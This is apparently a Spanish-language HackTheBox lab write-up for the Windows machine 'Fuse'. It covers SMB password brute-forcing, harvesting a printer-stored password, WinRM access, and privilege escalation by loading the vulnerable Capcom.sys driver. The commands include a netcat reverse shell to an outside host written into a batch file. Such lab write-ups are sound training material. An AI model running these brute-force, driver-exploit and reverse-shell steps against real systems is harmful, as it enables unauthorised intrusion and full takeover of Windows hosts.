---
layout      : post
title       : "HackTheBox - Fuse"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bannerfuse.png
category    : [ htb ]
tags        : [ windows-privileges, visual-studio, SMB ]
---
Máquina Windows nivel medio. Usaremos varios usuarios como diccionario para encontrar uno valido en el sistema, estando dentro explotaremos un permiso que nos deja subir drivers, subiremos uno conocido que tiene vulnerabilidades, aprovecharemos eso para lograr ejecución remota de comandos como Administrador. Debemos cambiarle claramente cosas al exploit por lo tanto debe ser compilado.

![fuseHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/fuseHTB.png)

### Como siempre, primero nuestro TL;DR (Spanish writeup)

Holas, bueno, inicialmente encontraremos varios usuarios en el `portal web`, haremos uso de `html2dic` para crear un diccionario y realizar fuerza bruta contra el servicio `SMB` para encontrar credenciales del usuario `bnielson`, nos veremos en la tarea de modificar su contraseña, ya que está caducada, usaremos `smbpasswd`. 

Con sus credenciales enumerando `rpcclient` encontraremos una contraseña guardada en una impresora y otros usuarios del sistema... Haremos una nueva fase de fuerza bruta para así conseguir el usuario `svc-print` el cual está asociado a esa contraseña, ya dentro de la máquina haciendo enumeración básica, vemos que el privilegio `SeLoadDriverPrivilege` está habilitado, lo usaremos para subir un driver de **CapCom**, el cual tiene algunas vulnerabilidades reportadas y una de ellas nos permitirá ejecutar una Shell como administrador... A darle candela.

> Acá un copie y pegue: Claramente vas a encontrar mucho texto, pero como he dicho en otros writeups, me enfoco en plasmar mis errores y existos, asi mismo aveces explico algo de más y me inspiro hablando (:, sin más, muchas gracias y a romper todo.

* Cree un [autopwn](https://github.com/lanzt/blog/tree/main/assets/scripts/HTB/fuse/autopwn_fuse.sh) para la subida y ejecucion de los archivos, para finalmente obtener la reverse shell... Pero hay un problema, no se cual sea por que entiendo que la logica y el llamado esta bien, pero la revsh la hace mal. (Subo el script por si alguno quiere hecharle un ojo y ver que problema tiene el llamado pa que me cuente pls...).

### Fases.

Como casi siempre tendremos 3 fases.

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
3. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración. {#enumeracion}

Empezamos obteniendo que puertos tiene activos la maquina. Usaremos `nmap` (:

```bash
$ nmap -p- --open -T4 -Pn -v 10.10.10.193 -oG initScant
```

El escaneo va muy lento (realmente lento), una solucion podria ser cambiar `-T` por `--min-rate`, que le indica cuantos paquetes queremos enviar en cada petición... Pero validando primero el output de la ejecucion con `-T` y la ejecucion con el `--min-rate` veo que hay unos puertos que no alcanza a detectar, por lo tanto nos quedaremos con el output inicial con `-T`.

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535                                                                                  |
| --open     | Solo los puertos que están abiertos                                                                      |
| -T4        | Forma de escanear super rapido, (claramente hace mucho ruido, pero al ser controlado no nos preocupamos) |
| --min-rate | Indica que no queremos hacer peticiones menores al num que pongamos (i.e: --min-rate=5000)               |
| -Pn        | Evita que realice Host Discovery, tales como Ping (P) y DNS (n)                                          |
| -v         | Permite ver en consola lo que va encontrando                                                             |
| -oG        | Guarda el output en un archivo con formato grepeable, ya veremos para que                                |

![nmapinitScan](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/nmapinitScan.png)

Ahora, con la función que creo [s4vitar](https://s4vitar.github.io/) podemos extraer los puertos del archivo **initScan** diciendole que nos los copie en la clipboard, evitando tener que escribirlos uno a uno para nuestro siguiente escaneo. La funcion simplemente en mi caso se agregaria al `$ ~/.bashrc`.

![extractPorts](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png)

```bash
$ extractPorts initScan
```

Ahora que tenemos los puertos, haremos un escaneo para validar que versión y scripts maneja cada uno.

```bash
nmap -p53,80,135,139,445,636,3268,49667 -sC -sV 10.10.10.193
```

| Parámetro | Descripción   |
| ----------|:------------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

![nmapportScan](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/nmapportScan.png)

Bien, analicemos que tenemos destacable... 

* Puerto DNS (53)
* Puerto web (80)
* RPC (135 y 49667)
* SMB (445 y Netbios (139))
* LDAP (3269) nos muestra el dominio

Ademas podemos destacar que en base a los scripts nos extrajo el nombre del dominio en el que vamos a tener que trabajar `Domain name: fabricorp.local` y el FQDN, el cual incluye el nombre de la computadora y el nombre del dominio, `FQDN: Fuse.fabricorp.local`.

### Veamos el puerto DNS (53)

Podemos indicarle mediante `dig` que es una herramienta que realiza busquedas en los registros DNS, que nos traiga cualquier informacion asociada a esa IP con su dominio.

![diganydomain](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/diganydomain.png)

Acá tambien se nos lista el FQDN y otro host `hostmaster` que anotaremos por si algo. Por ahora nada más por acá.

### Veamos el servicio web (80)

![pageip](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/pageip.png)

Cuando ponemos la ip nos redirecciona a `fuse.fabricorp.local/papercut/logs/html/index.htm`. Entonces podemos modificar nuestro archivo `$ /etc/hosts` indicandole que cuando hagamos una peticion a `10.10.10.193` nos de la respuesta de `fuse.fabricorp.local`.

```bash
$ cat /etc/hosts
127.0.0.1       localhost
10.10.10.193    fuse.fabricorp.local
...
```

Y si ahora intentamos ingresar ya sea por la IP o por el mismo dominio que pusimos nos responde así.

![pagefusefabricorp](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/pagefusefabricorp.png)

Nos encontramos con un software llamado **PaperCut™ Print Logger**.

> "Es una aplicación gratuita para plataformas de Windows que registra las operaciones de impresión y proporciona en tiempo real registros detallados de la actividad de su impresora." [PaperCut](https://www.papercut.com/products/free-software/print-logger/spanish/).

Perfecto, tenemos 3 logs, ademas de ver los logs podemos tambien ver usuarios (vamos creando una lista de ellos) que probablemente alguno nos funcione para usarlo despues.

Siendo un DC por lo general los usuarios son registrados de la siguiente forma:

> i.e: Si el nombre es `Mara Toure`, lo mas común sería `mtoure`.

![pagelogs](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/pagelogs.png)

Ademas en el log del **29 de mayo** podemos ver que se hace referencia a un **Notepad** y que su titulo parece tener otro usuario: `bnielson`, anotemoslo en la lista de users.

Si descargamos algun `.csv` nos imprime la misma información de la web, en este caso descargamos el log del 29 de mayo (si, la imagen lo dice, pero bueno, hay gente que se le pasa y se pierde :P)

![pagedownload29may](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/pagedownload29may.png)

Lo que nos podemos dar cuenta es que algunas impresiones tienen documentos "impresionantes e.e".

* backup_tapes - Notepad
* Fabricorp01.docx - Word
* printing_issue_test - Notepad

Estas son las que destaco... De resto no veo que más podemos sacar de acá.

### Veamos el puerto SMB (445)

No logre hacer nada, ni `smbclient` ni `smbmap` y `crackmapexec` solo me mostraba que el servidor SMB está soportado por un Windows Server 2016 Standard, que esto también lo vimos en el escaneo a las versiones.

### Veamos el puerto LDAP (3269)

Nada tampoco :(

...

Al estar prácticamente estancado decidí pedir ayuda, me indicaron que probara crear un wordlist para el usuario y otro para la password y buscara con que herramienta probar los diccionarios... Pues lo primero será crear las wordlist, en esta fase tuve algunos problemas, ya que `CeWL` no tomaba todas las palabras completas, buscando en internet encontré `html2dic` que como dice, toma un **html** extrae las palabras y el output queda en formato de **diccionario**. Así que ese output lo guardaremos en un archivo que llamaremos `dic.txt`.

El tema con `html2dic` es que debemos hacer la extracción con cada página.

```bash
$ curl -s http://fuse.fabricorp.local/papercut/logs/html/papercut-print-log-2020-05-29.htm > dic
$ html2dic dic > dic.txt
$ cat dic.txt | sort | uniq > dic.txt
#Seguimos con otra pagina y repetimos, solo que al hacer la linea del `uniq` evitamos borrar el contenido que tenemos y lo sobre escribimos con **>>**
$ ...
$ cat dic.txt | sort | uniq >> dic.txt
$ ...
```

![bashwordlists](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bashwordlists.png)

Listo, ya teniendo los dos wordlist, podemos usar `CrackMapExec` hacia `SMB` para validar si obtenemos algo.

```bash
$ cme smb 10.10.10.193 -u users.txt -p dic.txt
```

![bashcmepass](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bashcmepass.png)

...

## Explotación. {#explotacion}

Bien, obtenemos algo raro, pero al menos es diferente, nos indica que la password debe ser cambiada... Buscando con el error que nos sale, vemos varios foros, en uno de ellos hablan de `smbpasswd` y su flag `-r (remote)`, la cual nos permite cambiar la password de un usuario de SMB, pues nada, a probar :P.

* [smbclient-says-nt-status-password-must-change-how-to-change-password](https://samba.samba.narkive.com/I0oDpMEz/smbclient-says-nt-status-password-must-change-how-to-change-password).
* [FAILED-with-error-NT-STATUS-PASSWORD-MUST-CHANGE](http://samba.2283325.n4.nabble.com/FAILED-with-error-NT-STATUS-PASSWORD-MUST-CHANGE-td2445714.html).

```bash
$ smbpasswd -r 10.10.10.193 -U 'bnielson'
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user bnielson
```

...

> El escaneo inicial me dejo con dudas, ya que no vi algún puerto disponible para usar [evil-winrm](https://github.com/Hackplayers/evil-winrm) y podernos conectar con algunas credenciales de manera remota al pc. Por eso decidi hacer otro escaneo pero total, sin parametros ni nada, el resultado fue este:

```bash
$ nmap -p- --open -vvv 10.10.10.193
```

![nmapTotalScan](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/nmaptotalscan.png)

Y si, varios puertos que no habíamos visto, entre ellos uno para el mantenimiento remoto: 5985, sigamos (:

La password que le asigne es **Estaes01**. Pero al ser un usuario al que todos deben de cambiar la contraseña, pues cada **x** segundos nuestra password deja de funcionar, así que o somos rápidos o crearemos un script (realmente intente hacer el script pero no lo logre, si alguien sabe como jugar con los inputs de cada comando hábleme y me enseña por favor), así que fui rápido :P, posteriormente usaremos `crackmapexec` para ver a que recursos tenemos acceso y con `smbget` nos descargaremos el recurso a nuestra máquina para ya olvidarnos de cambiar contraseñas y todo ese rollo :)

```bash
$ cme smb 10.10.10.193 -u bnielson -p Estaes001 --shares
...
#Vemos varios recursos, `print$` y `SYSVOL` son interesantes, descargemos los dos
$ smbget -R smb://10.10.10.193/SYSVOL -U bnielson
$ smbget -R smb://10.10.10.193/print$ -U bnielson
```

> ¿Por que SYSVOL es importante?, generalmente se usa un script para cambiar la contraseña del admin local, necesario para cumplir las **gpp (Preferencias de politica de grupo)**, ese script esta guardado en la ruta `SYSVOL` y a menudo en texto claro. 

* [Video de s4vitar explicando SYSVOL](https://www.youtube.com/watch?v=bFmBBgncY4o&t=1768).

![bashcmepass](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bashcmepass.png)

El directorio `SYSVOL` nos da un error, al parecer hay un archivo al cual no tenemos acceso y nos cancela toda la descarga. 

![bashsmbsysvolfail](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bashsmbsysvolfail.png)

Podemos usar `smbclient` para entrar en el directorio `/SYSVOL` e intentar descargar desde ahí los archivos. Así mismo podemos usar `rpcclient` para con las nuevas credenciales ver que podemos encontrar (de los comandos que encontré, pude obtener otro conjunto de usuarios, pero nada más).

```bash
$ smbclient //10.10.10.193/SYSVOL -U bnielson

recurse ON # Carpetas y subcarpetas
prompt OFF # Para que no pregunte si realmente queremos descargar X folder
mget *     # Descargar todo
```

![bashsmbsysvoldone](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bashsmbsysvoldone.png)

En este caso si nos permitió bajar los otros archivos :) 

![bashlsprintysys](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bashlsprintysys.png)

Pero enumerando el directorio `/SYSVOL`, no tiene nada relevante, así que seguiremos con `/print$`... Enumerando y enumerando no encontré nada, haciendo grep, por tipos de archivo, volviendo a descargar pensando que se me había olvidado algo, pero nada, estuve perdido, así que lo mejor fue pedir ayuda.

Me indicaron que usara `rpcclient` peeero con un comando que no había usado, **enumprinters**, el cual nos muestra info de las impresoras y alguna que otra descripción, pues...

![rpccenumprinters](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/rpccenumprinters.png)

Opa, vemos una contraseña, tomémosla y validemos con `cme` junto a los usuarios que tenemos (y los nuevos).

![bashcmesvcprint](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bashcmesvcprint.png)

Listo, vemos que tenemos el mismo acceso que `bnielson`, probemos de una con `evil-winrm` por el puerto **5985** que encontramos con el nuevo escaneo.

![evilwrsvcprint](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/evilwrsvcprint.png)

Ahoraaaa a enumerar.

...

## Escalada de privilegios. {#escalada-de-privilegios}

Si hacemos búsquedas de servicios o software corriendo no obtenemos nada, subiendo [**winPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) y/o [**PowerUp.ps1**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) tampoco, ni enumerando carpetas y subcarpetas tenemos algo... Solamente en el directorio raíz tenemos un `readme.txt` y una carpeta `/test`.

![evilwrreadme](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/evilwrreadme.png)

> **Spoiler**: Es probable que las demas carpetas tengan proteccion con un antivirus o algo por el estilo, por lo tanto tambien es probable que si se creo una carpeta en la raiz llamada **test** (en la que podemos hacer cualquier cosa) pues que no tenga o no nos tengamos que preocupar por alguna proteccion con **AV**.

Viendo los permisos que tiene el usuario `svc-print` con **whoami /priv** (también con **/all** los muestra) de primeras ninguno me sorprendió, así que busque info de cada uno y uno de ellos tiene algo interesante.

![evilwrwhoamipriv](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/evilwrwhoamipriv.png)

El privilegio `SeLoadDriverPrivilege` nos permite subir un driver al kernel, por lo cual explorando en internet vemos que hay un driver explotable: **Capcom**, el cual con otra utilidad (la que lo explota) nos permita ejecutar una reverse Shell con permisos de administrador

En nuestro caso tenemos el privilegio ya activado, por lo tanto solo nos queda la explotación. Hay dos buenos post para guiarse:

* [Español - Tarlogic](https://www.tarlogic.com/blog/explotacion-de-la-directiva-cargar-y-descargar-controladores-de-dispositivo-seloaddriverprivilege/).
* [Ingles - HackTricks](https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#seloaddriverprivilege).

Usando el código del `NTLoadDriver.cpp` podemos intentar subir el driver [**Capcom.sys**](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys).

Nos indica que usa dos argumentos: 

* Le indicamos donde está ubicado el driver que queremos subir.
* Registro del kernel donde guardar el driver, junto al SID (ID de seguridad) de usuario.

Muy bien, sabiendo esto, démosle al `NTLoadDriver`, obteniendo el SID de `svc-print` vemos esto:

```powershell
PS> Get-ADUser -Identity 'svc-print' | select SID

S-1-5-21-2633719317-1471316042-3957863514-1104
```

Lo siguiente es compilar o buscar los binarios, para posteriormente subirlos a la máquina, así que podemos usar `Visual Studio` para ello. Primero usamos el código de **HackTricks**...

La compilación y la ejecución parecen estar bien, pero no obtengo ningún output... Estuve modificando y buscando otras maneras pero no encontré, le tuve que volver a pedir ayuda a [**TazWake**](https://www.hackthebox.eu/profile/49335) moderador HTB y un duro en seguridad. Me indico que el no había hecho ese procedimiento, que había usado un ejecutable de [**VbScrub**](https://www.hackthebox.eu/profile/158833). El cual también nos permite subir un driver pasándole los dos parámetros del **NTLoadDriver**. Además me recalco el posible uso de AV en toda la maquina menos en la carpeta **test** de la raíz (Este era el **spoiler**, ya que antes estaba guardando y ejecutando todo en otra carpeta).

* [Herramienta de VbScrub: VbLoadDriver](https://github.com/VbScrub/VbLoadDriver).

Y pasandole los mismos parametros de antes, su uso seria:

```powershell
> VbLoadDriver.exe HKU\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\Services\Capcom C:\test\Capcom.sys
```

![evilwruploaddriverdone](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/evilwruploaddriverdone.png)

Listo, logramos ejecutar correctamente el binario. Ahora solo nos queda hablar sobre como explotar **Capcom.sys**.

Existe una utilidad llamada [**ExploitCapcom**](https://github.com/tandasat/ExploitCapcom) ¿Bastante intuitiva no?. Pues lo que tenemos que indicarle es (aunque lo intente sin las 2 primeras linea y me funciono igual :P):

```powershell
> sc.exe create Capcom type= kernel binPath= C:\test\Capcom.sys
> sc.exe start Capcom
> ./ExploitCapcom.exe
```

Listo, conociendo su uso debemos modificar esta porcion de codigo:

![vsexploitcaprevshell](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/vsexploitcaprevshell.png)

Para llegar a esa solución tuve muchos (muchos) intentos fallidos y básicamente fue por no parar y buscar sobre la función que ejecuta el comando en el sistema.

* [Documentación de Microsoft sobre **CreateProcess()**](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa).

Apoyándome en esa descripción, es que entendí que debía indicarle como primer parámetro (nombre de la aplicación): `NULL`, ya que estamos en la consola y no estoy ejecutando ninguna aplicación... Y en el segundo parámetro (linea de comando) si dejar la petición de la revshell.

Compilando, subiendo y ejecutando logramos obtener la dichosa Shell como administrador :)

![flags_fuse](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/flags_fuse.png)

...

Después caí en cuenta que para evitar tantas compilaciones, sencillamente hubiera podido crear un archivo `.bat` con las instrucciones del **netcat** y que el ejecutable llamara a ese archivo .__ .

Creamos el archivo:

```bash
> echo "@echo off" > retrievemagic.bat
> echo "C:\test\nc.exe 10.10.15.35 4433 -e cmd.exe" >> retrievemagic.bat
```

Y después simplemente le indicamos que siempre nos ejecute ese archivo :)

![vsexploitcaprevshell](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/vsexploitcapcomwithbatfile.png)

...

He creado un script para la subida y ejecución de los archivos... El único problema está en la obtención de la reverse Shell (no sé por qué, averigüe y averigüe pero nada). De igual forma seguiré testeando, pero lo subo por si alguno sabe como debe ser llamado `ExploitCapcom.exe` desde el script para que haga la petición correctamente. Lo demás funciona perfe, sube los archivos y carga el driver.

El problema está en la herramienta (winrm) o en la línea de ejecución del script, ya que tomando el mismo comando y usándolo dentro de la sesión de PowerShell de `evilwinrm` ta todo bien y se ejecuta correctamente.

* Acá el autopwn: [autopwn_fuse.sh](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/fuse/autopwn_fuse.sh).

...

Qué bonita maquina, curiosa e interesante forma de escalar privilegios, me gusto mucho el usar herramientas a las que no estamos acostumbrados (**Visual Studio**) para compilar y crear nuestros `.exe`... Cada vez más cariño a las máquinas **Windows** aunque sean (siento yo) más difíciles... Muchas gracias yyyyyyyyyyyyyyyyyyyy a seguir rompiendo todo (: